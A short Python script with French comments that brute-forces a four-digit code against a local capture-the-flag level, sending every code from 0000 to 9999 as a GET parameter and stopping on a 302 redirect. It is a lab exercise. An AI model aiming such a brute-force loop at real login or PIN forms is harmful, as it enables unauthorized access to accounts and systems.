import requests

# URL de la page vulnérable
url = "http://localhost/2bgp-ctf/levels/4/"

# Fonction pour tester un code
def brute_force_code():
    for code in range(10000):  # Tous les codes de 0000 à 9999
        code_str = f"{code:04}"  # Formatage en 4 chiffres (ex: 0001, 0002, etc.)
        params = {"code": code_str}  # Paramètre GET
        
        # Envoyer la requête sans suivre les redirections automatiquement
        response = requests.get(url, params=params, allow_redirects=False)
        
        # Vérifier si une redirection se produit (code 302)
        if response.status_code == 302:
            print(f"Code trouvé : {code_str}")
            print(f"Redirection vers : {response.headers['Location']}")
            break
        else:
            print(f"Testé : {code_str} - Incorrect")

# Lancer l'attaque
brute_force_code()